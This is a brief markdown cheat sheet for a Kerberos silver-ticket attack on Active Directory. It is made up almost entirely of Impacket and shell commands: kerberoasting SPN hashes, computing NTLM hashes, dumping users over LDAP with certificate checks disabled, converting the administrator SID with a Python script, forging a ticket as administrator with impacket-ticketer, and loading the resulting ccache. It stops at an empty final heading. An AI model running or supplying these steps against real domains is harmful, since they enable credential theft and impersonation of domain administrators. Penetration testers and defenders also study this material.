# Gather Info

## Get SPN and Dump Hash

Request SPN info using Kerberos
`impacket-GetUserSPNs domain/username:password -dc-ip dcfqdn -request -k`

## Create NTLM Hash of Password

Ensure correct format, and create proper hash
`iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4`

## Obtain Domain SID

### Primary Method

Use any user to authenticate and get DA SID
`impacket-getPac -targetUser administrator domain/username:password`

### Alternate Method

Get DC LDAP Cert
`echo -n | openssl s_client -connect dcfqdn:636 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/P' > ldapserver.pem`

LDAP Search to Dump Users
The `tls_reqcert=never` is to allow self-signed certs.
If you need to troubleshoot, append `-d 5` to the command for debug info.
`ldapsearch -H ldap://ldapserverfqdn -Z -D username@domain -w password -b "DC=domainpart1,DC=domainafterdot" "(objectClass=user)" -o tls_cacert=./ldapserver.pem -o tls_reqcert=never > ldapsearch.out`

Find Administrator SID
`grep -A30 Administrator ldapsearch.out`

Convert it
```
sid.py:

#!/usr/bin/env python3

import base64
import struct
import sys

b64sid = sys.argv[1]
binsid = base64.b64decode(b64sid)
a, N, cccc, dddd, eeee, ffff, gggg = struct.unpack("BBxxxxxxIIIII", binsid)
bb, bbbb = struct.unpack(">xxHIxxxxxxxxxxxxxxxxxxxx", binsid)
bbbbbb = (bb << 32) | bbbb

print(f"S-{a}-{bbbbbb}-{cccc}-{dddd}-{eeee}-{ffff}-{gggg}")

./sid.py administratorbase64sid
```

# Exploit

## Request Silver Ticket

Impacket Ticketer
Be sure to omit the -500 on the end of the SID.
`impacket-ticketer -nthash otheruserntlmhash -domain-sid administratorsid -domain domain -dc-ip dcfqdn -spn otheruserspnincludingport administrator`

## Set Env Var

ccache file
`export KRB5CCNAME=administrator.ccache`

## Connect to Desired Services

